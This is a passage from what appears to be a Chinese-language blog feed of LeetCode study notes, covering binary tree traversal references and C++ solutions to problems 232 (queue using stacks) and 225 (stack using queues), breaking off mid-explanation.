class="line">A B D E G H C F I   // Preorder</span><br><span class="line">D B G E H A F I C   // Inorder</span><br><span class="line">D G H E B I F C A   // Postorder</span><br><span class="line">A B C D E F G H I   // Levelorder</span><br></pre></td></tr></table></figure><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這篇介紹了甚麼是Tree，它的定義與特性， Binary Tree 和不同的 Traversal 方法和程式碼，後續會更進一步介紹的延伸的程式碼實作，並且介紹 BST(Binary Search Tree) 還有 BFS, DFS的實作方式。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://hackmd.io/@meyr543/r1lbVkb-K">https://hackmd.io/@meyr543/r1lbVkb-K</a><br>[2] <a href="https://www.geeksforgeeks.org/difference-between-bfs-and-dfs/">https://www.geeksforgeeks.org/difference-between-bfs-and-dfs/</a><br>[3] <a href="https://alrightchiu.github.io/SecondRound/binary-tree-jian-li-yi-ke-binary-tree.html">https://alrightchiu.github.io/SecondRound/binary-tree-jian-li-yi-ke-binary-tree.html</a><br>[4] <a href="https://web.ntnu.edu.tw/~algo/BinaryTree.html">https://web.ntnu.edu.tw/~algo/BinaryTree.html</a><br>[5] <a href="https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in">https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in</a><br>[6] <a href="https://it5606.medium.com/%E5%BB%BA%E7%AB%8Bbinary-tree-a02fedbc51a8">https://it5606.medium.com/%E5%BB%BA%E7%AB%8Bbinary-tree-a02fedbc51a8</a><br>[7] <a href="https://hackmd.io/@Aquamay/HyCgHXfid">https://hackmd.io/@Aquamay/HyCgHXfid</a><br>[8] <a href="https://jimmyswebnote.com/tree/">https://jimmyswebnote.com/tree/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Tree Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Stack來實現Queue | Easy | LeetCode#232. Implement Queue using Stacks</title>
      <link href="/posts/8cb54984.html"/>
      <url>/posts/8cb54984.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/232/question1.jpeg"><br><img src="/img/LeetCode/232/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 這題要求透過兩個 Stack 來實現一個Queue具有的基本操作，像是 <code>push</code>, <code>peek</code>, <code>pop</code> 以及 <code>empty</code></li></ul><p>題目也有提醒只可以使用標準 Stack 操作來實現 You must use only standard operations of a stack, which means only push to top, peek&#x2F;pop from top, size, and is empty operations are valid.</p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題跟 <a href="https://leozzmc.github.io/posts/6dfa2271.html">225. Implement Stack using Queues</a> 其實是很類似的:</p><p><img src="/img/LeetCode/232/algo.png"></p><p>Push 操作可以直接使用 <code>&lt;stack&gt;</code> 中的 <code>push()</code> STL 進行操作，重點會是實現 <code>pop()</code> 跟 <code>peak()</code>，由於Queue會是 FIFO，因此先進去Queue的會先出來，因此我們用Stack實作的時候等同於要優先將Stack的底部元素pop出來，這時候就需要第二個Stack進行暫存。</p><p>因此每當我們需要Pop時，都必須將最底部元素以外的資料全部push進第二個stack，結束操作後就可以再複製回第一個stack。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;&#125;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; sk1;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; sk2;</span><br><span class="line">    <span class="type">int</span> size_Sk1=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> size_Sk2=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        sk1.<span class="built_in">push</span>(x);</span><br><span class="line">        size_Sk1++;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk1; i++)&#123;</span><br><span class="line">            <span class="comment">// if it is the last element</span></span><br><span class="line">            <span class="keyword">if</span>(i==size_Sk1<span class="number">-1</span>)&#123;</span><br><span class="line">                result = sk1.<span class="built_in">top</span>();</span><br><span class="line">                sk1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sk2.<span class="built_in">push</span>(sk1.<span class="built_in">top</span>());</span><br><span class="line">                sk1.<span class="built_in">pop</span>();</span><br><span class="line">                size_Sk2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//copy sk2 to sk1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk2; i++)&#123;</span><br><span class="line">            sk1.<span class="built_in">push</span>(sk2.<span class="built_in">top</span>());</span><br><span class="line">            sk2.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        size_Sk2=<span class="number">0</span>;</span><br><span class="line">        size_Sk1--;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment">// queue.front(), This is equal to the bottom of the stack</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk1; i++)&#123;</span><br><span class="line">            <span class="comment">// if it is the last element</span></span><br><span class="line">            <span class="keyword">if</span>(i==size_Sk1<span class="number">-1</span>)&#123;</span><br><span class="line">                result = sk1.<span class="built_in">top</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sk2.<span class="built_in">push</span>(sk1.<span class="built_in">top</span>());</span><br><span class="line">                sk1.<span class="built_in">pop</span>();</span><br><span class="line">                size_Sk2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//copy sk2 to sk1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk2; i++)&#123;</span><br><span class="line">            sk1.<span class="built_in">push</span>(sk2.<span class="built_in">top</span>());</span><br><span class="line">            sk2.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        size_Sk2=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue* obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;peek();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;<span class="type">int</span>&gt; sk1;</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; sk2;</span><br><span class="line"><span class="type">int</span> size_Sk1=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> size_Sk2=<span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>首先初始化兩個 stack 以及stack大小</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    sk1.<span class="built_in">push</span>(x);</span><br><span class="line">    size_Sk1++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的Queue操作都由Sk1實現，這裡就正常push</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk1; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==size_Sk1<span class="number">-1</span>)&#123;</span><br><span class="line">            result = sk1.<span class="built_in">top</span>();</span><br><span class="line">            sk1.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            sk2.<span class="built_in">push</span>(sk1.<span class="built_in">top</span>());</span><br><span class="line">            sk1.<span class="built_in">pop</span>();</span><br><span class="line">            size_Sk2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk2; i++)&#123;</span><br><span class="line">        sk1.<span class="built_in">push</span>(sk2.<span class="built_in">top</span>());</span><br><span class="line">        sk2.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    size_Sk2=<span class="number">0</span>;</span><br><span class="line">    size_Sk1--;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>pop() 從Queue中移除並返回front</li><li>如果 <code>sk1</code> 為空，則返回 -1</li><li>使用 for 循環將 <code>sk1</code> 中的所有資料移動到 <code>sk2</code>，但保留最後一個資料，這個資料就是要返回的結果</li><li>然後將 <code>sk2</code> 中的所有資料移回 <code>sk1</code></li><li>最後更新 <code>size_Sk1</code> 和 <code>size_Sk2</code> 的值，並返回結果</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk1; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==size_Sk1<span class="number">-1</span>)&#123;</span><br><span class="line">            result = sk1.<span class="built_in">top</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            sk2.<span class="built_in">push</span>(sk1.<span class="built_in">top</span>());</span><br><span class="line">            sk1.<span class="built_in">pop</span>();</span><br><span class="line">            size_Sk2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_Sk2; i++)&#123;</span><br><span class="line">        sk1.<span class="built_in">push</span>(sk2.<span class="built_in">top</span>());</span><br><span class="line">        sk2.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    size_Sk2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>peek() 返回隊列front元素，但不移除它</li><li>如果 <code>sk1</code> 為空，則返回 -1</li><li>操作類似於 pop() ，但最後不pop出最前面的資料(Stack底部資料)，而是僅保存其值並將 <code>sk2</code> 所有資料移回 <code>sk1</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sk1.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>檢查Queue 是否為空，等同於檢查 <code>sk1</code> 是否為空</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/232/result.jpeg"></p><blockquote><p>我覺得是 peak 跟 pop 花費太久時間</p></blockquote><h2 id="比較簡潔的寫法"><a href="#比較簡潔的寫法" class="headerlink" title="比較簡潔的寫法"></a>比較簡潔的寫法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; s1, s2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        s1.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!s1.<span class="built_in">empty</span>()) s2.<span class="built_in">push</span>(s1.<span class="built_in">top</span>()), s1.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> ans = s2.<span class="built_in">top</span>();</span><br><span class="line">        s2.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">while</span>(!s2.<span class="built_in">empty</span>()) s1.<span class="built_in">push</span>(s2.<span class="built_in">top</span>()), s2.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!s1.<span class="built_in">empty</span>()) s2.<span class="built_in">push</span>(s1.<span class="built_in">top</span>()), s1.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> ans = s2.<span class="built_in">top</span>();</span><br><span class="line">        <span class="keyword">while</span>(!s2.<span class="built_in">empty</span>()) s1.<span class="built_in">push</span>(s2.<span class="built_in">top</span>()), s2.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s1.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>這中間的概念就是，push一樣正常push到s1，但pop的時候，只要將s1依序push到s2，這樣stack中的top就會是queue的front，直接回傳top資料就好，而這時再將s2元素丟回s1。<br>然後我那個 for 去迭代的寫法真的醜，用 <code>while(!s1.empty())</code> 比較水</p></blockquote><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li><code>push</code>, <code>empty</code>: $O(1)$</li><li><code>pop</code>, <code>peak</code>: $O(N)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>四個 method 都是 $O(1)$，大多是重新排列現有元素</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Stack </tag>
            
            <tag> Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Queue來實現Stack | Easy | LeetCode#225. Implement Stack using Queues</title>
      <link href="/posts/6dfa2271.html"/>
      <url>/posts/6dfa2271.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/225/question1.jpeg"><br><img src="/img/LeetCode/225/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 本題要求僅能使用兩個Queue來實現具有LIFO特性的Stack功能，需要能夠支援正常的Stack操作像是(<code>push</code>, <code>pop</code>, <code>top</code>, <code>empty</code>功能)，題目額外提醒，我們只能使用常規queue操作，像是<code>push to back</code>, <code>peek/pop from the front</code>, <code>size</code>, <code>isEmpty</code>。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>由於 <strong>我覺得Stack 跟 Queue最大的不同就是 FIFO 以及 LIFO，因此只要有辦法調整pop出來的順序即可</strong>，因此push可以正常push，但pop需要能夠回傳queue的尾端元素，top的話就直接用<code>&lt;queue&gt;</code> 的 <code>back()</code> 即可。</p><p><img src="/img/LeetCode/225/algo.png"></p><p>題目有說可以用兩個Queue，因此一個正常push進去的queue，如果要對它進行 pop，我們就需要依序將queue內資料Pop出來直到找到最後一個資料，但這些被pop出來的資料從Stack角度來看應該還要存在於Stack中，所以我們需要另一個queue將原先pop出來的元素存放起來。一旦原先的queue清空後，這時候可能使用者又會再進行push，由於我們push,pop操作都是在第一個queue進行，目前有資料的queue只是用來暫存資料用，因此需要把第二個queue的資料全部移動回第一個queue。</p><p>接著 top 以及empty用queue原本的STL即可實現。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q1;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt;q2;</span><br><span class="line">    <span class="built_in">MyStack</span>() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        q1.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = q1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;empty queue&quot; &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="comment">//the last element in the queue</span></span><br><span class="line">            <span class="keyword">if</span>(i==size<span class="number">-1</span>) &#123;</span><br><span class="line">                result = q1.<span class="built_in">front</span>();</span><br><span class="line">                q1.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="comment">//copy q2 to q1</span></span><br><span class="line">                size = q2.<span class="built_in">size</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">                    q1.<span class="built_in">push</span>(q2.<span class="built_in">front</span>());</span><br><span class="line">                    q2.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                size =<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                q2.<span class="built_in">push</span>(q1.<span class="built_in">front</span>());</span><br><span class="line">                q1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q1.<span class="built_in">empty</span>()) <span class="keyword">return</span> q1.<span class="built_in">back</span>();</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;empty queue&quot; &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack* obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;top();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>一開始宣告兩個 <code>int</code> 型別的Queue, q1 和 q2</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; q1;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q2;</span><br></pre></td></tr></table></figure><p><code>push</code> 函數將元素 x 推入Stack中，實際操作其實是將資料加入到 <code>q1</code> 的尾部</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    q1.<span class="built_in">push</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pop</code> 函數，首先檢查 